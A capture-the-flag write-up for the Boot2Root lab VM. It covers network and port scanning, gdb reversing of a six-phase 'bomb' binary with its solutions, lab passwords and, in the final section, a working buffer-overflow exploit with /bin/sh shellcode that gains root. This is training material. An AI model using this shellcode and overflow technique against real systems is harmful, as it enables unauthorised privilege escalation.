# Boot2Root

## writeup 1

### 1st step : get the ip of the vm

```
$ arp-scan -l -I eth0
[...]
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.2.1 52:54:00:12:35:00 QEMU
10.0.2.2 52:54:00:12:35:00 QEMU
10.0.2.3 08:00:27:c9:e5:50 CADMUS COMPUTER SYSTEMS
10.0.2.17				   08:00:27:6d:9d:0b	CADMUS COMPUTER SYSTEMS
```

or :
```
VBoxManage guestproperty enumerate <vm-name>
```

### step2 : scan the ports on the machine

```
map -p- -T5 -A -sV <vm-addr>(10.0.2.17)
[...]
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-08 19:27 CEST
Nmap scan report for 10.0.2.17
Host is up (0.00025s latency).
Not shown: 65529 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: more have SASL-IR post-login LOGIN-REFERRALS LITERAL+ Pre-login LOGINDISABLEDA0001 capabilities listed ID OK STARTTLS IDLE IMAP4rev1 ENABLE
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_ssl-date: 2018-10-08T17:27:39+00:00; 0s from scanner time.
443/tcp open  ssl/http Apache httpd 2.2.22
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_ssl-date: 2018-10-08T17:27:38+00:00; 0s from scanner time.
993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: more SASL-IR have LOGIN-REFERRALS LITERAL+ Pre-login post-login capabilities listed ID OK AUTH=PLAINA0001 IDLE IMAP4rev1 ENABLE
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_ssl-date: 2018-10-08T17:27:39+00:00; 0s from scanner time.
MAC Address: 08:00:27:6D:9D:0B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Nmap done: 1 IP address (1 host up) scanned in 20.38 seconds
```

here we got 2 or 3 things interesting :
	 - ftp on 21
	 - ssh on 22
	 - http on 80
	 - https on 443
	 - mail server on 993 ?

we can connect through ssh on port 22 with the previous write up.
with the credentials `laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

we got a binary called bomb let's see what we can do with it,

after looking at the main, we can see there is 6 phase for this bomb.

### Phase 1

gdb-peda$ pd phase_1
```
Dump of assembler code for function phase_1:
0x08048b20 <+0>:    push   ebp
0x08048b21 <+1>:    mov    ebp,esp
0x08048b23 <+3>:    sub    esp,0x8
0x08048b26 <+6>:    mov    eax,DWORD PTR [ebp+0x8]
0x08048b29 <+9>:    add    esp,0xfffffff8
==>  0x08048b2c <+12>:    push   0x80497c0    <==== 
0x08048b31 <+17>:    push   eax
0x08048b32 <+18>:    call   0x8049030 <strings_not_equal>
0x08048b37 <+23>:    add    esp,0x10
0x08048b3a <+26>:    test   eax,eax
0x08048b3c <+28>:    je     0x8048b43 <phase_1+35>
0x08048b3e <+30>:    call   0x80494fc <explode_bomb>
0x08048b43 <+35>:    mov    esp,ebp
0x08048b45 <+37>:    pop    ebp
0x08048b46 <+38>:    ret
End of assembler dump.
gdb-peda$ x/1s 0x80497c0
0x80497c0:	   "Public speaking is very easy."
```

### Phase 2
```
gdb-peda$ pd phase_2
Dump of assembler code for function phase_2:
0x08048b48 <+0>:   push   ebp
0x08048b49 <+1>:    mov    ebp,esp
0x08048b4b <+3>:  sub    esp,0x20
0x08048b4e <+6>:  push   esi
0x08048b4f <+7>:  push   ebx
0x08048b50 <+8>:   mov    edx,DWORD PTR [ebp+0x8]
0x08048b53 <+11>	add    esp,0xfffffff8
0x08048b56 <+14>:	lea    eax,[ebp-0x18]
0x08048b59 <+17>:   push   eax
0x08048b5a <+18>:   push   edx
0x08048b5b <+19>: call   0x8048fd8 <read_six_numbers>
0x08048b60 <+24>:  add    esp,0x10
0x08048b63 <+27>:  cmp    DWORD PTR [ebp-0x18],0x1   <== check if the 1st number is set to "1"
0x08048b67 <+31>:	 je     0x8048b6e <phase_2+38>
0x08048b69 <+33>:	 call   0x80494fc <explode_bomb>
0x08048b6e <+38>:	mov    ebx,0x1
0x08048b73 <+43>:	lea    esi,[ebp-0x18]
0x08048b76 <+46>:	lea    eax,[ebx+0x1]
0x08048b79 <+49>:	  imul   eax,DWORD PTR [esi+ebx*4-0x4] <== **
0x08048b7e <+54>:  cmp    DWORD PTR [esi+ebx*4],eax
0x08048b81 <+57>:  je     0x8048b88 <phase_2+64>
0x08048b83 <+59>:  call   0x80494fc <explode_bomb>
0x08048b88 <+64>:	 inc    ebx
0x08048b89 <+65>:	 cmp    ebx,0x5
0x08048b8c <+68>: 	 jle    0x8048b76 <phase_2+46>
0x08048b8e <+70>:	lea    esp,[ebp-0x28]
0x08048b91 <+73>:	pop    ebx
0x08048b92 <+74>:   pop    esi
0x08048b93 <+75>:   mov    esp,ebp
0x08048b95 <+77>:  pop    ebp
0x08048b96 <+78>:  ret
End of assembler dump.

```
```
tab_int[index] * (index + 1) != numbers[index + 1])
tab_int[] = {1, (1 * (1 + 1)) = 2, (2 * '2 + 1') = 6, (6 * (3+1)) = 24, 120, 720 }

input : 1 2 6 24 120 720 
```

### Phase 3
```
pd phase_3
Dump of assembler code for function phase_3:
[...]
0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>   <== call sscanf
0x08048bbc <+36>:	add    esp,0x20
0x08048bbf <+39>:	cmp    eax,0x2					<== cmp if the return of sccanf with  2 
0x08048bc2 <+42>:   jg     0x8048bc9 <phase_3+49>   <== at least 3 args 
0x08048bc4 <+44>:	call   0x80494fc <explode_bomb>
0x08048bc9 <+49>:	cmp    DWORD PTR [ebp-0xc],0x7  <== cmp our 1st arg with 7 
0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
[...]
0x08048be0 <+72>:	mov    bl,0x71                    <== when 2nd arg  = 0x71 'q'
0x08048be2 <+74>:	cmp    DWORD PTR [ebp-0x4],0x309  <== case 3rd arg must == 777 
0x08048be9 <+81>:	je     0x8048c8f <phase_3+247>
0x08048bef <+87>:	call   0x80494fc <explode_bomb>
0x08048bf4 <+92>:	jmp    0x8048c8f <phase_3+247>
0x08048bf9 <+97>:	lea    esi,[esi+eiz*1+0x0]
0x08048c00 <+104>:  mov    bl,0x62					 <== when 2nd arg	= 0x71 'b'
0x08048c02 <+106>:	cmp    DWORD PTR [ebp-0x4],0xd6  <== case 3rd arg must == 214
0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
0x08048c14 <+124>:	jmp    0x8048c8f <phase_3+247>
[...]
0x08048c8f <+247>:	cmp    bl,BYTE PTR [ebp-0x5]   <== cmp 2nd arg with 'b'
					 
```
we got multiple input working for this one
but the README specify that the passwd must contain  a 'b'
it leave us with
```
 1 b 214
 2 b 744
 7 b 524
```

### Phase 4
```
gdb-peda$ pd phase_4
Dump of assembler code for function phase_4:
0x08048ce0 <+0>:	   push   ebp
0x08048ce1 <+1>: 	   mov    ebp,esp
0x08048ce3 <+3>:	   sub    esp,0x18
0x08048ce6 <+6>:  	   mov    edx,DWORD PTR [ebp+0x8]
0x08048ce9 <+9>:	   add    esp,0xfffffffc
0x08048cec <+12>:	   lea    eax,[ebp-0x4]
0x08048cef <+15>:	   push   eax
0x08048cf0 <+16>:	   push   0x8049808
0x08048cf5 <+21>:	   push   edx
0x08048cf6 <+22>:	   call   0x8048860 <sscanf@plt>
0x08048cfb <+27>: 	   add    esp,0x10
0x08048cfe <+30>:	   cmp    eax,0x1
0x08048d01 <+33>:  	   jne    0x8048d09 <phase_4+41>
0x08048d03 <+35>:	   cmp    DWORD PTR [ebp-0x4],0x0
0x08048d07 <+39>:	   jg     0x8048d0e <phase_4+46>
0x08048d09 <+41>:	   call   0x80494fc <explode_bomb>
0x08048d0e <+46>:	   add    esp,0xfffffff4
0x08048d11 <+49>:	   mov    eax,DWORD PTR [ebp-0x4]
0x08048d14 <+52>:	   push   eax
0x08048d15 <+53>:  	   call   0x8048ca0 <func4>			<== call to fct4 
0x08048d1a <+58>:	   add    esp,0x10
0x08048d1d <+61>:	   cmp    eax,0x37					<== check if the return value of fct4 == '7'
0x08048d20 <+64>:	   je     0x8048d27 <phase_4+71>
0x08048d22 <+66>:	   call   0x80494fc <explode_bomb>
0x08048d27 <+71>: 	   mov    esp,ebp
0x08048d29 <+73>:	   pop    ebp
0x08048d2a <+74>:	   ret
End of assembler dump.

```

I first thought we needed to give 7 to scanf but the return value of fct differ a bit
after a few tries i saw the value 9 given to fct4 return '7'
input value :
``` 9 ```

### Phase 5
```
gdb-peda$ pd phase_5
Dump of assembler code for function phase_5:
0x08048d2c <+0>:   push   ebp
0x08048d2d <+1>:    mov    ebp,esp
0x08048d2f <+3>:  	sub    esp,0x10
0x08048d32 <+6>:  	push   esi
0x08048d33 <+7>: 	push   ebx
0x08048d34 <+8>: 	mov    ebx,DWORD PTR [ebp+0x8]
0x08048d37 <+11>:	add    esp,0xfffffff4
0x08048d3a <+14>:	push   ebx
0x08048d3b <+15>:   call   0x8049018 <string_length>
0x08048d40 <+20>:   add    esp,0x10
0x08048d43 <+23>: 	cmp    eax,0x6                  <== strings kength must be equal to 6 
0x08048d46 <+26>:  	je     0x8048d4d <phase_5+33>
0x08048d48 <+28>:  	call   0x80494fc <explode_bomb>
0x08048d4d <+33>: 	xor    edx,edx
0x08048d4f <+35>: 	lea    ecx,[ebp-0x8]
0x08048d52 <+38>:	mov    esi,0x804b220          <== "isrveawhobpnutfg" here is the 'shit string '
0x08048d57 <+43>:	mov    al,BYTE PTR [edx+ebx*1]
0x08048d5a <+46>:	and    al,0xf
0x08048d5c <+48>:   movsx  eax,al
0x08048d5f <+51>: 	mov    al,BYTE PTR [eax+esi*1]
0x08048d62 <+54>:  	mov    BYTE PTR [edx+ecx*1],al
0x08048d65 <+57>:  	inc    edx
0x08048d66 <+58>: 	cmp    edx,0x5
0x08048d69 <+61>: 	jle    0x8048d57 <phase_5+43>
0x08048d6b <+63>: 	mov    BYTE PTR [ebp-0x2],0x0
0x08048d6f <+67>:	add    esp,0xfffffff8
0x08048d72 <+70>:	push   0x804980b                <== 0x804980b == "giants"
0x08048d77 <+75>:   lea    eax,[ebp-0x8]
0x08048d7a <+78>:   push   eax
0x08048d7b <+79>:  	call   0x8049030 <strings_not_equal>
0x08048d80 <+84>:  	add    esp,0x10
0x08048d83 <+87>:  	test   eax,eax
0x08048d85 <+89>:  	je     0x8048d8c <phase_5+96>
0x08048d87 <+91>:  	call   0x80494fc <explode_bomb>
0x08048d8c <+96>:  	lea    esp,[ebp-0x18]
0x08048d8f <+99>: 	pop    ebx
0x08048d90 <+100>:	 pop    esi
0x08048d91 <+101>: 	 mov    esp,ebp
0x08048d93 <+103>:	pop    ebp
0x08048d94 <+104>:   ret
End of assembler dump.

```

a became s
b => r
c => v
[...]
p => i
q => s 
r => r
[...]

with that we find that the string to get 'giants' is op[eu]km[aq]"

### Phase 6

after given 6 digit (1 2 3 4 5 6)

```
gdb-peda$ x/1wd 0x804b26c-0x2
0x804b26c <node1>:	253          <= 1

gdb-peda$ x/1wd 0x804b26c-0xc
0x804b260 <node2>:	725			<= 2

gdb-peda$ x/1wd 0x804b26c-0x18
0x804b254 <node3>:	301			<= 3

x/1wd 0x804b26c-0x24
0x804b248 <node4>:	997			<= 4

x/1wd 0x804b26c-0x30
0x804b23c <node5>:	212			<= 5

gdb-peda$ x/1wd 0x804b26c-0x3c
0x804b230 <node6>:	432			<= 6


```

our digit correspond to the order of the nodes, 
at the end of the fct, the program check if the node are sorted.
so we have to sort our value, 

```
1 = 253   2 = 725   3 = 301   4 = 997   5 = 212   6 = 432

997 = 4  725 = 2    432 = 6   301 = 3   253 = 1   212 = 5   
```

input needed : 
``` 4 2 6 3 1 5  ```

### put all the phases together :
```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## Thor

here is a file named turtule, 
this is actually a map to drow that give us : 
``` SLASH ```

we just have to encypt it, after a few try we found that md5 is a match for zaz password.
```
646da671ca01bb5d84dbb5fb2238dc8e
```

## ZaZ
at this level it's a binary file to exploit.
nothing complicated here, it's just a buffer overflow 
we can see that cause of the strcpy 
```
(gdb) disas main
0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
```
the program crash if we give him 140 or more char. 
```
$ ./exploit_me $(python -c 'print("A" * 140)')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

We just have to load a shellcode in the env,
```
export GG=`python -c 'print "\x90" * 3000 + "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"'`
```
`'print "\x90" * 3000 ` allow us to call an address in the middle of the NOPS , after that the program will go through all the nops and arrive on our shellcode.
and then call the shellcode: 
```
./exploit_me `python -c 'print "A"* 140 + "\xff\xff\xd4\xed"[::-1]'`
```
`"\xff\xff\xd4\xed"` is and  address in the middle of the NOPS getting with gdb.

Run the little script, and We #are ##Root ### !